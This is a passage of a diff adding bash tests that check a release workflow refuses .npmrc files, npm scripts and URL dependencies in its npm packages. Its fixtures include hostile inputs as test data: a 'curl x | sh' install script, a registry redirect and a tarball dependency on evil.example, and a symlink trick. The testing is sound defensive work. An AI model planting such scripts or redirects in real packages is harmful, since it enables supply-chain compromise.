+	# npmrc_mutant <label> <exact text> <replacement> <npmrc_case arguments...>
+	npmrc_mutant() {
+		local label="$1" old="$2" new="$3" mutated res
+		shift 3
+		mutated="$(OLD="$old" NEW="$new" SRC="$NPMRC_STEP" bun -e 'const s = process.env.SRC; if (!s.includes(process.env.OLD)) process.exit(2); process.stdout.write(s.replace(process.env.OLD, () => process.env.NEW));')" || {
+			no "npm content mutant '${label}' could be applied (the step no longer has the text it mutates)"
+			return
+		}
+		res="$(NPMRC_STEP_UNDER_TEST="$mutated" npmrc_case "$@")"
+		if grep -q "^  FAIL" <<<"$res"; then ok "reports: ${label}"; else no "reports: ${label}" "the case passed a step with this hole"; fi
+	}
+	# shellcheck disable=SC2016 # literal workflow text, not shell.
+	{
+		npmrc_mutant 'the .npmrc search dropped (#1046)' \
+			'find . -name .npmrc -print -quit' 'true' \
+			'a .npmrc anywhere in the checkout is refused' refused 'mkdir -p ui/x && printf "x=1\n" >ui/x/.npmrc'
+		npmrc_mutant 'the .npmrc search held to sidecar/npm, missing one at the root (#1046)' \
+			'find . -name .npmrc -print -quit' 'find sidecar/npm -name .npmrc -print -quit' \
+			'a .npmrc at the root of the checkout is refused' refused 'printf "registry=https://evil.example/\n" >.npmrc'
+		npmrc_mutant 'scripts allowed back into the package fields (#1046)' \
+			'"repository", "version"]' '"repository", "scripts", "version"]' \
+			'a prepublishOnly script in a platform package is refused' refused 'npmrc_field linux-x64 ".scripts = {prepublishOnly: \"curl x | sh\"}"'
+		npmrc_mutant 'the wrapper package left out of the field check (#1046)' \
+			'.name == "@usejarvis/sidecar" and' 'true or' \
+			'a version script in the wrapper package is refused' refused 'npmrc_field jarvis-sidecar ".scripts = {version: \"id\"}"'
+		npmrc_mutant 'the tree check dropped, links let through (#1046 review)' \
+			'if [ "$tree" != ' 'if false && [ "$tree" != ' \
+			'a bin link to its own package, which an artifact would unpack a .npmrc through, is refused' refused 'ln -s . sidecar/npm/darwin-arm64/bin'
+		npmrc_mutant 'the platform name left unchecked (#1046 review)' \
+			'.name == $name and' '' \
+			'a platform package renamed to the brain is refused' refused 'npmrc_field darwin-x64 ".name = \"@usejarvis/brain\""'
+		npmrc_mutant 'the wrapper dependency values left unchecked (#1046 review)' \
+			'all(.[]; type == "string" and test(' 'all(.[]; type == "string" or test(' \
+			'the wrapper depending on a platform package by URL is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"@usejarvis/sidecar-linux-x64\"] = \"https://evil.example/x.tgz\""'
+		npmrc_mutant 'the wrapper dependencies left unchecked (#1046 review)' \
+			'(.optionalDependencies | type == "object" and keys == [' '(true or keys == [' \
+			'the wrapper depending on another package is refused' refused 'npmrc_field jarvis-sidecar ".optionalDependencies[\"evil\"] = \"1.0.0\""'
+	}
+fi
+# The step fails the release on a .npmrc anywhere in the checkout; this
+# fails the PR that adds one first. node_modules, .git and .claude are not
+# in a checkout.
+# npmrc_tree <dir>: every .npmrc under it, one per line.
+npmrc_tree() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	DIR="$1" bun -e '
+const fs = require("node:fs");
+const skip = new Set(["node_modules", ".git", ".claude"]);
+const walk = (d, rel) => {
+  for (const e of fs.readdirSync(d, { withFileTypes: true })) {
+    if (e.name === ".npmrc") console.log(rel + e.name);
+    if (e.isDirectory() && !skip.has(e.name)) walk(d + "/" + e.name, rel + e.name + "/");
+  }
+};
+walk(process.env.DIR, "");
+'
+}
+found="$(npmrc_tree "${HERE}/../..")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "no .npmrc in the repository, which publish-sidecar would refuse (#1046)"; else no "no .npmrc in the repository, which publish-sidecar would refuse (#1046)" "$found"; fi
+rm -rf "${WORK}/npmrctree" && mkdir -p "${WORK}/npmrctree/a/b" && printf 'x=1\n' >"${WORK}/npmrctree/a/b/.npmrc"
+if [ "$(npmrc_tree "${WORK}/npmrctree")" = "a/b/.npmrc" ]; then ok "reports: a .npmrc deep in the tree (#1046)"; else no "reports: a .npmrc deep in the tree (#1046)"; fi
+# ...and again where npm runs (security review of #1046): Prepare platform
+# packages, executed verbatim with an npm that only logs, against artifacts
+# shaped as a build job could shape them and a checkout whose bin/ is a link.
+PREP_STEP="$(FILE="$WORKFLOWS/sidecar-release.yml" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const st = (d.jobs?.["publish-sidecar"]?.steps ?? []).find((s) => s.name === "Prepare platform packages");
+if (!st || typeof st.run !== "string") process.exit(2);
+process.stdout.write(st.run);
+')" || PREP_STEP=""
+# prep_case <label> <ok|refused> <shell run in the workspace to shape it>
+prep_case() {
+	local d="${WORK}/prep" rc=0 ok_=0 p
+	rm -rf "$d" && mkdir -p "$d/ws/sidecar" "$d/bin" "$d/app/Jarvis.app/Contents/MacOS" && cp -R "${HERE}/../../sidecar/npm" "$d/ws/sidecar/npm" || {
+		no "npm content at Prepare: $1 (the fixture could not be made)"
+		return
+	}
+	printf '#!/usr/bin/env bash\nprintf "%%s %%s\\n" "$(basename "$PWD")" "$*" >>"%s/npm.log"\n' "$d" >"$d/bin/npm" && chmod +x "$d/bin/npm"
+	printf 'app\n' >"$d/app/Jarvis.app/Contents/MacOS/jarvis"
+	for p in linux-x64 linux-arm64; do mkdir -p "$d/ws/artifacts/sidecar-$p" && printf 'elf\n' >"$d/ws/artifacts/sidecar-$p/jarvis"; done
+	mkdir -p "$d/ws/artifacts/sidecar-win32-x64" && printf 'pe\n' >"$d/ws/artifacts/sidecar-win32-x64/jarvis.exe"
+	for p in darwin-arm64 darwin-x64; do mkdir -p "$d/ws/artifacts/sidecar-$p" && tar -czf "$d/ws/artifacts/sidecar-$p/jarvis-app.tar.gz" -C "$d/app" Jarvis.app; done
+	(cd "$d/ws" && D="$d" eval "$3") || {
+		no "npm content at Prepare: $1 (the fixture could not be shaped)"
+		return
+	}
+	: >"$d/npm.log"
+	(cd "$d/ws" && env -i PATH="$d/bin:$PATH" GITHUB_WORKSPACE="$d/ws" VERSION=1.2.3 bash -e -c "${PREP_STEP_UNDER_TEST:-$PREP_STEP}") >"$d/log" 2>&1 || rc=$?
+	case "$2" in
+	ok) [ "$rc" -eq 0 ] && [ "$(grep -c ' version 1.2.3 ' "$d/npm.log")" = 6 ] && ok_=1 ;;
+	refused) [ "$rc" -ne 0 ] && grep -q '^::error::.*(#1046)' "$d/log" && ! grep -q '^darwin-arm64 ' "$d/npm.log" && ok_=1 ;;
+	refused-wrapper) [ "$rc" -ne 0 ] && grep -q '^::error::the wrapper does not depend on all five' "$d/log" && ok_=1 ;;
+	esac
+	if [ "$ok_" = 1 ]; then ok "npm content at Prepare: $1"; else no "npm content at Prepare: $1" "exit ${rc}; log: $(cat "$d/log"); npm: $(cat "$d/npm.log")"; fi
+}
+# The app tarball with a .npmrc at its top, beside Jarvis.app.
+PREP_EVIL='printf "registry=https://evil.example/\n" >"$D/app/.npmrc" && for p in darwin-arm64; do tar -czf "artifacts/sidecar-$p/jarvis-app.tar.gz" -C "$D/app" Jarvis.app .npmrc; done'
+if [ -z "$PREP_STEP" ]; then
+	no "found sidecar-release.yml publish-sidecar: Prepare platform packages"
+else
+	prep_case 'the six packages version with their artifacts in' ok ':'
+	prep_case 'an app tarball unpacked into bin/ with a .npmrc in it is fine' ok "$PREP_EVIL"
+	prep_case 'a bin link to its package, through which the tarball lands a .npmrc beside npm, is refused' refused "ln -s . sidecar/npm/darwin-arm64/bin && $PREP_EVIL"
+	# The wrapper rewrite read back (round 2 review of #1046): sed edits
+	# lines. npm 12.1.0 puts a value back on its key line first (measured),
+	# and the npm here only logs, so this stands for an npm that does not.
+	PREP_SPLIT='sed -i "s|\"@usejarvis/sidecar-linux-x64\": \"0.1.0\"|\"@usejarvis/sidecar-linux-x64\":\n      \"0.1.0\"|" sidecar/npm/jarvis-sidecar/package.json && jq -e . sidecar/npm/jarvis-sidecar/package.json >/dev/null && grep -qx "      \"0.1.0\"," sidecar/npm/jarvis-sidecar/package.json'
+	prep_case 'a wrapper dependency the line-based rewrite misses is refused' refused-wrapper "$PREP_SPLIT"
+	# The field check again where npm runs (review of the branch): a
+	# package.json that differs from what the checkout check passed, here
+	# one carrying a script, stops Prepare before its npm version.
+	PREP_SCRIPT='jq ".scripts = {version: \"id\"}" sidecar/npm/darwin-arm64/package.json >pj.tmp && mv pj.tmp sidecar/npm/darwin-arm64/package.json'
+	prep_case 'a platform package.json that changed after the checkout check is refused before npm runs there' refused "$PREP_SCRIPT"
+	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if [ \"$(find \"${pkg_dir}\" -mindepth 1 -maxdepth 1"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && [ \"$(find \"${pkg_dir}\" -mindepth 1 -maxdepth 1"));')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "Prepare mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused "ln -s . sidecar/npm/darwin-arm64/bin && $PREP_EVIL")"; then
+		ok "reports: Prepare no longer checking the package directory before npm (#1046 review)"
+	else
+		no "reports: Prepare no longer checking the package directory before npm (#1046 review)" "the case passed a step with this hole"
+	fi
+	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if ! jq -e --arg name"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && jq -e --arg name"));')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "Prepare field re-check mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused "$PREP_SCRIPT")"; then
+		ok "reports: Prepare no longer checking package.json fields before npm (review of #1046)"
+	else
+		no "reports: Prepare no longer checking package.json fields before npm (review of #1046)" "the case passed a step with this hole"
+	fi
+	mutated="$(SRC="$PREP_STEP" bun -e 'const s = process.env.SRC; const o = "if ! jq -e --arg v"; if (!s.includes(o)) process.exit(2); process.stdout.write(s.replace(o, () => "if false && jq -e --arg v"));')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "Prepare read-back mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(PREP_STEP_UNDER_TEST="$mutated" prep_case 'x' refused-wrapper "$PREP_SPLIT")"; then
+		ok "reports: the wrapper rewrite no longer read back (#1046 review)"
+	else
+		no "reports: the wrapper rewrite no longer read back (#1046 review)" "the case passed a step with this hole"
+	fi
+fi
+# ...and before the first step that runs npm, or sets it up.
+npmrc_order() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	FILE="$1" NAME="$NPMRC_STEP_NAME" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const steps = d.jobs?.["publish-sidecar"]?.steps ?? [];
+const at = steps.findIndex((s) => s.name === process.env.NAME);
+const first = steps.findIndex((s) => /\bnpm\b/.test(String(s.run ?? "")) || String(s.uses ?? "").toLowerCase().startsWith("actions/setup-node@"));
+if (at < 0) console.log("publish-sidecar has no step " + process.env.NAME);
+else if (first >= 0 && first < at) console.log("publish-sidecar sets up or runs npm in step " + first + " (" + (steps[first].name ?? steps[first].uses) + "), before " + process.env.NAME);
+'
+}
+found="$(npmrc_order "$WORKFLOWS/sidecar-release.yml")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "sidecar-release.yml: publish-sidecar checks npm config and package fields before it sets up or runs npm (#1046)"; else no "sidecar-release.yml: publish-sidecar checks npm config and package fields before it sets up or runs npm (#1046)" "$found"; fi
+copy="${WORK}/npmrc-order.yml"
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+if FROM="$WORKFLOWS/sidecar-release.yml" TO="$copy" NAME="$NPMRC_STEP_NAME" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+const m = new RegExp("      - name: " + process.env.NAME + "\\n        run: \\|\\n(?:          .*\\n|\\n)*?\\n").exec(s);
+const anchor = "      - name: Ensure npm supports Trusted Publishing\n";
+if (!m || !s.includes(anchor)) process.exit(2);
+const t = s.replace(m[0], "");
+await Bun.write(process.env.TO, t.replace(anchor, () => m[0] + anchor));
+' && grep -qF 'sets up or runs npm in step' <<<"$(npmrc_order "$copy")"; then
+	ok "reports: the npm content check moved after setup-node (#1046)"
+else
+	no "reports: the npm content check moved after setup-node (#1046)"
+fi
+if FROM="$WORKFLOWS/sidecar-release.yml" TO="$copy" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+const old = "      - name: Refuse npm config and package fields that change what npm runs\n";
+if (!s.includes(old)) process.exit(2);
+await Bun.write(process.env.TO, s.replace(old, () => "      - name: Something else\n"));
+' && grep -qF 'has no step' <<<"$(npmrc_order "$copy")"; then
+	ok "reports: the npm content check gone from publish-sidecar (#1046)"
+else
+	no "reports: the npm content check gone from publish-sidecar (#1046)"
 fi
 
 echo
